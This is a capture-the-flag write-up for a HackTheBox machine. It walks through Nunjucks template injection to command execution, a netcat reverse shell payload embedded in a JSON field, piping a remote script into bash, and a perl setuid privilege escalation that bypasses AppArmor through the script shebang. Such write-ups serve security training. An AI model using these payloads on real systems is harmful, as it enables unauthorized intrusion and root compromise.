@@ -1,0 +1,447 @@
+I"�|<h2 id="summary">Summary</h2>
+
+<p>Nunchucks starts by enumerating a subdomain of the website that uses a node.js templating engine called nunjucks. We find we can use <a href="https://portswigger.net/research/server-side-template-injection">SSTI</a> to get code execution on the server and from there get a reverse shell. With a foothold on the box we find perl has been given the <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">CAP_SETUID</a> capability. From there we find out we can exploit the SUID capability, even thought there is an AppArmour rule in place to limit it’s use.</p>
+
+<p>I enjoyed this easy box and used it as a chance to brush up on SSTI on a tempating engine I’ve not come across before. As well as a chance to learn about the AppArmour rule bypass which Im sure will come up again in the future.</p>
+
+<h2 id="initial-recon">Initial Recon</h2>
+
+<p>We’ll use Nmap to do a fast scan of all TCP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> 10.129.95.252 <span class="nt">--min-rate</span> 100000
+
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-16 12:11 GMT
+Warning: 10.129.95.252 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>10.129.95.252
+Host is up <span class="o">(</span>0.028s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 60747 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 4785 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre></div></div>
+
+<p>Then we can use Nmap again, to do further in depth script and version scans of just the open ports found in the previous scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80,443 <span class="nt">-oN</span> nunchucks-services.nmap 10.129.95.252
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-16 12:12 GMT
+Nmap scan report <span class="k">for </span>10.129.95.252
+Host is up <span class="o">(</span>0.011s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to https://nunchucks.htb/
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
+| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+| Not valid before: 2021-08-30T15:42:24
+|_Not valid after:  2031-08-28T15:42:24
+|_http-title: Nunchucks - Landing Page
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+| tls-nextprotoneg:
+|_  http/1.1
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.41 seconds
+</code></pre></div></div>
+
+<p>Nmap found a hostname of <code class="language-plaintext highlighter-rouge">nunchucks.htb</code> in the SSL certificate, so we’ll add that to our known hosts file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
+
+10.129.95.252 nunchucks.htb
+</code></pre></div></div>
+
+<p>Browsing to the site at <code class="language-plaintext highlighter-rouge">http://nunchucks.htb/</code> brings up an SSL Self Signed Certificate warning that we need to accept.</p>
+
+<p>Only do this for CTF boxes as it can be a warning sign that something is wrong on a real site.</p>
+
+<p><img src="assets/nunchucks_screenshots/HttpsIndexPage.png" alt="HttpsIndexPage.png" /></p>
+
+<p><img src="assets/nunchucks_screenshots/HttpsSignUpPage.png" alt="HttpsSignUpPage.png" /></p>
+
+<p><img src="assets/nunchucks_screenshots/HttpsLogInPage.png" alt="HttpsLogInPage.png" /></p>
+
+<p>Tring to LogIn or SignUp dosen’t send a request, it must be handled in javascript with the ‘currently closed’ message.</p>
+
+<p><img src="assets/nunchucks_screenshots/HttpsSignUpClosed.png" alt="HttpsSignUpClosed.png" /></p>
+
+<p>We notice at the bottom of the page a message with ‘Store: Coming soon’</p>
+
+<p><img src="assets/nunchucks_screenshots/HttpsStoreCommingSoon.png" alt="HttpsStoreCommingSoon.png" /></p>
+
+<p>We can fuzz for vhosts with ffuf.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> http://FUZZ.nunchucks.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</code></pre></div></div>
+
+<pre><code class="language-txt">
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://FUZZ.nunchucks.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+store                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 10ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 151 req/sec :: Duration: [0:00:50] :: Errors: 4988 ::
+</code></pre>
+
+<p>As suspected we find a store subdomain, let’s add this to our known hosts file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
+
+10.129.95.252 nunchucks.htb store.nunchucks.htb
+</code></pre></div></div>
+
+<p>Browsing to the store subdomain brings us to a news letter sign up page for the new store coming soon.</p>
+
+<p><img src="assets/nunchucks_screenshots/HtppsStoreIndexPage.png" alt="HtppsStoreIndexPage.png" /></p>
+
+<p>The notify box has a javascript filter requiring an email address. Until an email address is provided, no requests are sent.
+Once we input an email address we can intercept the request in burp and change the post data. It is formatted as a json sting.</p>
+
+<p><img src="assets/nunchucks_screenshots/HtppsStoreEmailFilter.png" alt="HtppsStoreEmailFilter.png" /></p>
+
+<p><img src="assets/nunchucks_screenshots/HttpsBurpIntercept.png" alt="HttpsBurpIntercept.png" /></p>
+
+<p>Sending an empty string with an extra double quote returns an error.
+The error shows the web app is based on node.js.</p>
+
+<p><img src="assets/nunchucks_screenshots/BurpError.png" alt="BurpError.png" /></p>
+
+<h2 id="nunjucks-ssti-exploit">Nunjucks SSTI exploit</h2>
+
+<p>After trying multiple exploit payloads, such as common sql injection, csrf payloads, XSS, XXE, we find that the site is vulnerable to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI</a> and will evaluate math.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span>
+<span class="nx">$</span><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span>
+</code></pre></div></div>
+
+<p><img src="assets/nunchucks_screenshots/BurpSstiPayload.png" alt="BurpSstiPayload.png" /></p>
+
+<p>Googling for <code class="language-plaintext highlighter-rouge">node template engine</code> takes us to <a href="https://expressjs.com/en/resources/template-engines.html">Express Template Engines</a> where <code class="language-plaintext highlighter-rouge">Nunjucks</code> sticks out.</p>
+
+<p><img src="assets/nunchucks_screenshots/ExpressTemplateEngines.png" alt="ExpressTemplateEngines.png" /></p>
+
+<p><a href="https://github.com/mozilla/nunjucks">Nunjucks</a></p>
+
+<p>Googling for <code class="language-plaintext highlighter-rouge">nunjucks ssti</code> brings us to <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">Sandbox Breakout</a> which after some explaining givess us a payload to execute os commands.</p>
+
+<p><img src="assets/nunchucks_screenshots/NunjucksOsCommandInjectionSSTI.png" alt="NunjucksOsCommandInjectionSSTI.png" /></p>
+
+<p>We will use backslashes to escape the double quotes in the payload so that it plays nice with the json request.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="err">\</span><span class="dl">"</span><span class="s2">return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')</span><span class="se">\"</span><span class="s2">)()}}
+</span></code></pre></div></div>
+
+<p><img src="assets/nunchucks_screenshots/BurpSstiCodeExecution.png" alt="BurpSstiCodeExecution.png" /></p>
+
+<p>Start a netcat listener</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9001
+</code></pre></div></div>
+
+<p>Now we have code execution we’ll try for a reverse shell.
+Trying the usual suspects for reverse shell one liners, we eventualy land on the netcat temp file reverse shell.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"{{range.constructor(</span><span class="se">\"</span><span class="s2">returnglobal.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.54 9001 &gt;/tmp/f')</span><span class="se">\"</span><span class="s2">)()}}"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="assets/nunchucks_screenshots/BurpReverseShell.png" alt="BurpReverseShell.png" /></p>
+
+<p>We can get a propper pty shell with the python trick.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 9001
+Connection from 10.129.95.252:57206
+/bin/sh: 0: cant access <span class="nb">tty</span><span class="p">;</span> job control turned off
+<span class="nv">$ </span>which python
+<span class="nv">$ </span>which python3
+/usr/bin/python3
+<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+david@nunchucks:/var/www/store.nunchucks<span class="nv">$ </span>^Z
+<span class="o">[</span>1]  + 36614 suspended  nc <span class="nt">-lvnp</span> 9001
+
+<span class="c"># tuz @ hackbox in ~ [15:16:56] C:148</span>
+<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + 36614 continued  nc <span class="nt">-lvnp</span> 9001
+
+david@nunchucks:/var/www/store.nunchucks<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+david@nunchucks:/var/www/store.nunchucks<span class="err">$</span>
+</code></pre></div></div>
+
+<p>We can now grab the user flag.</p>
+
+<p><img src="assets/nunchucks_screenshots/user_proof.png" alt="user_proof.png" /></p>
+
+<h2 id="privesc">PrivEsc</h2>
+
+<p>After some basic manual enunmeration I decided to run <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh">linpeas</a> to save time.</p>
+
+<p>We can download it to our attacker box, host it localy then download it on the victim.</p>
+
+<p>Attacker</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh <span class="o">&amp;&amp;</span> python <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>Victim</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-q</span> <span class="nt">-O</span> - http://10.10.14.54/linpeas.sh | bash
+</code></pre></div></div>
+
+<p>Linpeas shows PERL has the setuid capability.</p>
+
+<p><img src="assets/nunchucks_screenshots/LinpeasPerlSetuidCap.png" alt="LinpeasPerlSetuidCap.png" /></p>
+
+<p>We could have found this manualy with <code class="language-plaintext highlighter-rouge">getcap</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> /
+</code></pre></div></div>
+
+<p>Knowing this, we can use <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">GTFObins</a> to show us how we can abuse the SUID capablities.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-e</span> <span class="s1">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
+</code></pre></div></div>
+
+<p>But that dosen’t work here.
+(note: we will investigate why once we have root.)</p>
+
+<p>Let’s insted look for perl scripts we might be able to abuse.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> <span class="k">*</span>.pl <span class="nt">-ls</span> 2&gt;/dev/null
+...snip...
+
+151448      4 <span class="nt">-rwxr-xr-x</span>   1 root     root          838 Sep  1 12:53 /opt/backup.pl
+</code></pre></div></div>
+
+<p>We find a backup script in <code class="language-plaintext highlighter-rouge">/opt</code>.
+Let’s read the script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/backup.pl
+</code></pre></div></div>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>
+<span class="k">use</span> <span class="nv">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
+<span class="k">use</span> <span class="nv">DBI</span><span class="p">;</span>
+<span class="k">use</span> <span class="nv">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span>
+<span class="nn">POSIX::</span><span class="nv">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="p">"</span><span class="s2">/tmp</span><span class="p">";</span>
+<span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="p">'</span><span class="s1">/var/www</span><span class="p">';</span>
+<span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="nv">strftime</span><span class="p">("</span><span class="s2">%Y-%m-%d-%s</span><span class="p">",</span> <span class="nb">localtime</span><span class="p">);</span>
+<span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="p">"</span><span class="si">$tmpdir</span><span class="s2">/backup_</span><span class="si">$now</span><span class="p">";</span>
+
+<span class="k">sub </span><span class="nf">printlog</span>
+<span class="p">{</span>
+    <span class="k">print</span> <span class="p">"</span><span class="s2">[</span><span class="p">",</span> <span class="nv">strftime</span><span class="p">("</span><span class="s2">%D %T</span><span class="p">",</span> <span class="nb">localtime</span><span class="p">),</span> <span class="p">"</span><span class="s2">] </span><span class="si">$_</span><span class="s2">[0]</span><span class="se">\n</span><span class="p">";</span>
+<span class="p">}</span>
+
+<span class="k">sub </span><span class="nf">archive</span>
+<span class="p">{</span>
+    <span class="nv">printlog</span> <span class="p">"</span><span class="s2">Archiving...</span><span class="p">";</span>
+    <span class="nb">system</span><span class="p">("</span><span class="s2">/usr/bin/tar -zcf </span><span class="si">$tmpbdir</span><span class="s2">/backup_</span><span class="si">$now</span><span class="s2">.tar </span><span class="si">$backup_main</span><span class="s2">/* 2&gt;/dev/null</span><span class="p">");</span>
+    <span class="nv">printlog</span> <span class="p">"</span><span class="s2">Backup complete in </span><span class="si">$tmpbdir</span><span class="s2">/backup_</span><span class="si">$now</span><span class="s2">.tar</span><span class="p">";</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">die</span> <span class="p">"</span><span class="s2">You must run this script as root.</span><span class="se">\n</span><span class="p">";</span>
+<span class="p">}</span>
+
+<span class="nv">printlog</span> <span class="p">"</span><span class="s2">Backup starts.</span><span class="p">";</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+<span class="nv">&amp;archive</span><span class="p">;</span>
+<span class="nv">printlog</span> <span class="p">"</span><span class="s2">Moving </span><span class="si">$tmpbdir</span><span class="s2">/backup_</span><span class="si">$now</span><span class="s2"> to /opt/web_backups</span><span class="p">";</span>
+<span class="nb">system</span><span class="p">("</span><span class="s2">/usr/bin/mv </span><span class="si">$tmpbdir</span><span class="s2">/backup_</span><span class="si">$now</span><span class="s2">.tar /opt/web_backups/</span><span class="p">");</span>
+<span class="nv">printlog</span> <span class="p">"</span><span class="s2">Removing temporary directory</span><span class="p">";</span>
+<span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+<span class="nv">printlog</span> <span class="p">"</span><span class="s2">Completed</span><span class="p">";</span>
+</code></pre></div></div>
+
+<p>The script uses the setuid function.
+Let’s write our own script to call sh with the setuid bit set.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /dev/shm/suid_bash.pl
+</code></pre></div></div>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nv">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
+<span class="k">use</span> <span class="nv">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span>
+<span class="nn">POSIX::</span><span class="nv">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="nb">exec</span> <span class="p">"</span><span class="s2">/bin/sh</span><span class="p">"</span>
+</code></pre></div></div>
+
+<p>Trying to call the script with perl still results in permision denied.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl ~/suid_bash.pl
+Cant open perl script <span class="s2">"/home/david/suid_bash.pl"</span>: Permission denied
+</code></pre></div></div>
+
+<p>But chmod’ing the script to be executable, then running it works as intended.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x ~/suid_bash.pl
+~/suid_bash.pl
+
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+</code></pre></div></div>
+
+<p><img src="assets/nunchucks_screenshots/root_proof.png" alt="root_proof.png" /></p>
+
+<h2 id="post-root-invistergation-into-perl-capabilities">Post Root Invistergation into perl capabilities</h2>
+
+<p>This is weird, so we’ll look into why this happens. The only reasons I can think of are:</p>
+
+<ul>
+  <li>file system being mounted nosuid, but we ran it from a script so that doesn’t make sense.</li>
+  <li>SELinux or AppArmour security policies.</li>
+</ul>
+
+<p>We’ll double check the file system with mount first.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount | <span class="nb">grep</span> <span class="s1">'nosuid'</span>
+
+sysfs on /sys <span class="nb">type </span>sysfs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+proc on /proc <span class="nb">type </span>proc <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+udev on /dev <span class="nb">type </span>devtmpfs <span class="o">(</span>rw,nosuid,noexec,relatime,size<span class="o">=</span>958032k,nr_inodes<span class="o">=</span>239508,mode<span class="o">=</span>755<span class="o">)</span>
+devpts on /dev/pts <span class="nb">type </span>devpts <span class="o">(</span>rw,nosuid,noexec,relatime,gid<span class="o">=</span>5,mode<span class="o">=</span>620,ptmxmode<span class="o">=</span>000<span class="o">)</span>
+tmpfs on /run <span class="nb">type </span>tmpfs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,size<span class="o">=</span>200640k,mode<span class="o">=</span>755<span class="o">)</span>
+securityfs on /sys/kernel/security <span class="nb">type </span>securityfs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+tmpfs on /dev/shm <span class="nb">type </span>tmpfs <span class="o">(</span>rw,nosuid,nodev<span class="o">)</span>
+tmpfs on /run/lock <span class="nb">type </span>tmpfs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,size<span class="o">=</span>5120k<span class="o">)</span>
+tmpfs on /sys/fs/cgroup <span class="nb">type </span>tmpfs <span class="o">(</span>ro,nosuid,nodev,noexec,mode<span class="o">=</span>755<span class="o">)</span>
+cgroup2 on /sys/fs/cgroup/unified <span class="nb">type </span>cgroup2 <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,nsdelegate<span class="o">)</span>
+cgroup on /sys/fs/cgroup/systemd <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,xattr,name<span class="o">=</span>systemd<span class="o">)</span>
+pstore on /sys/fs/pstore <span class="nb">type </span>pstore <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+none on /sys/fs/bpf <span class="nb">type </span>bpf <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,mode<span class="o">=</span>700<span class="o">)</span>
+cgroup on /sys/fs/cgroup/hugetlb <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,hugetlb<span class="o">)</span>
+cgroup on /sys/fs/cgroup/net_cls,net_prio <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,net_cls,net_prio<span class="o">)</span>
+cgroup on /sys/fs/cgroup/memory <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,memory<span class="o">)</span>
+cgroup on /sys/fs/cgroup/rdma <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,rdma<span class="o">)</span>
+cgroup on /sys/fs/cgroup/freezer <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,freezer<span class="o">)</span>
+cgroup on /sys/fs/cgroup/cpu,cpuacct <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,cpu,cpuacct<span class="o">)</span>
+cgroup on /sys/fs/cgroup/perf_event <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,perf_event<span class="o">)</span>
+cgroup on /sys/fs/cgroup/cpuset <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,cpuset<span class="o">)</span>
+cgroup on /sys/fs/cgroup/devices <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,devices<span class="o">)</span>
+cgroup on /sys/fs/cgroup/blkio <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,blkio<span class="o">)</span>
+cgroup on /sys/fs/cgroup/pids <span class="nb">type </span>cgroup <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,pids<span class="o">)</span>
+mqueue on /dev/mqueue <span class="nb">type </span>mqueue <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+debugfs on /sys/kernel/debug <span class="nb">type </span>debugfs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+tracefs on /sys/kernel/tracing <span class="nb">type </span>tracefs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+fusectl on /sys/fs/fuse/connections <span class="nb">type </span>fusectl <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+configfs on /sys/kernel/config <span class="nb">type </span>configfs <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+binfmt_misc on /proc/sys/fs/binfmt_misc <span class="nb">type </span>binfmt_misc <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+</code></pre></div></div>
+
+<p>There are no suid restrictions on the root of the file system <code class="language-plaintext highlighter-rouge">/home/david</code> where we’re trying to call the script from, so it’s definalty not that.
+This might have been the case if we tried to run the script from <code class="language-plaintext highlighter-rouge">/dev/shm</code>, which is something to keep in mind.</p>
+
+<p>Let’s look into AppArmour next.
+As root, we can check AppArmour status with <code class="language-plaintext highlighter-rouge">aa-status</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aa-status
+
+apparmor module is loaded.
+14 profiles are loaded.
+14 profiles are <span class="k">in </span>enforce mode.
+   /usr/bin/man
+   /usr/bin/perl
+   /usr/lib/NetworkManager/nm-dhcp-client.action
+   /usr/lib/NetworkManager/nm-dhcp-helper
+   /usr/lib/connman/scripts/dhclient-script
+   /usr/sbin/mysqld
+   /usr/sbin/tcpdump
+   /<span class="o">{</span>,usr/<span class="o">}</span>sbin/dhclient
+   ippusbxd
+   lsb_release
+   man_filter
+   man_groff
+   nvidia_modprobe
+   nvidia_modprobe//kmod
+0 profiles are <span class="k">in </span>complain mode.
+2 processes have profiles defined.
+2 processes are <span class="k">in </span>enforce mode.
+   /usr/sbin/mysqld <span class="o">(</span>985<span class="o">)</span>
+   /usr/sbin/dhclient <span class="o">(</span>708<span class="o">)</span> /<span class="o">{</span>,usr/<span class="o">}</span>sbin/dhclient
+0 processes are <span class="k">in </span>complain mode.
+0 processes are unconfined but have a profile defined.
+</code></pre></div></div>
+
+<p>As suspected there is an AppArmour rule for perl. Let’s look at it. AppArmour rules live in <code class="language-plaintext highlighter-rouge">/etc/apparmour.d/</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/apparmor.d/
+total 72
+drwxr-xr-x   7 root root  4096 Oct 28 17:03 <span class="nb">.</span>
+drwxr-xr-x 125 root root 12288 Oct 29 13:26 ..
+drwxr-xr-x   4 root root  4096 Oct 28 17:03 abstractions
+drwxr-xr-x   2 root root  4096 Oct 28 17:03 disable
+drwxr-xr-x   2 root root  4096 Oct 28 17:03 force-complain
+drwxr-xr-x   2 root root  4096 Oct 28 17:03 <span class="nb">local</span>
+<span class="nt">-rw-r--r--</span>   1 root root  1313 May 19  2020 lsb_release
+<span class="nt">-rw-r--r--</span>   1 root root  1108 May 19  2020 nvidia_modprobe
+<span class="nt">-rw-r--r--</span>   1 root root  3222 Mar 11  2020 sbin.dhclient
+drwxr-xr-x   5 root root  4096 Oct 28 17:03 tunables
+<span class="nt">-rw-r--r--</span>   1 root root  3202 Feb 25  2020 usr.bin.man
+<span class="nt">-rw-r--r--</span>   1 root root   442 Sep 26 01:16 usr.bin.perl
+<span class="nt">-rw-r--r--</span>   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
+<span class="nt">-rw-r--r--</span>   1 root root  2006 Jul 22 11:53 usr.sbin.mysqld
+<span class="nt">-rw-r--r--</span>   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
+<span class="nt">-rw-r--r--</span>   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/apparmor.d/usr.bin.perl
+<span class="c"># Last Modified: Tue Aug 31 18:25:30 2021</span>
+<span class="c">#include &lt;tunables/global&gt;</span>
+
+/usr/bin/perl <span class="o">{</span>
+  <span class="c">#include &lt;abstractions/base&gt;</span>
+  <span class="c">#include &lt;abstractions/nameservice&gt;</span>
+  <span class="c">#include &lt;abstractions/perl&gt;</span>
+
+  capability setuid,
+
+  deny owner /etc/nsswitch.conf r,
+  deny /root/<span class="k">*</span> rwx,
+  deny /etc/shadow rwx,
+
+  /usr/bin/id mrix,
+  /usr/bin/ls mrix,
+  /usr/bin/cat mrix,
+  /usr/bin/whoami mrix,
+  /opt/backup.pl mrix,
+  owner /home/ r,
+  owner /home/david/ r,
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Googling <code class="language-plaintext highlighter-rouge">apparmor ignore script shebang</code> leads us to <a href="https://bugs.launchpad.net/apparmor/+bug/1911431">AppArmour - Unable to prevent execution of shebang lines</a></p>
+
+<p>Apparently AppArmour ignores the path based rules when scripts have a shebang (i.e <code class="language-plaintext highlighter-rouge">#!/usr/bin/perl</code> ), which is why we can use our exploit from a script with a shebang, but not by invoking the perl interpreter directly. Another good point to keep in mind.</p>
+:ET
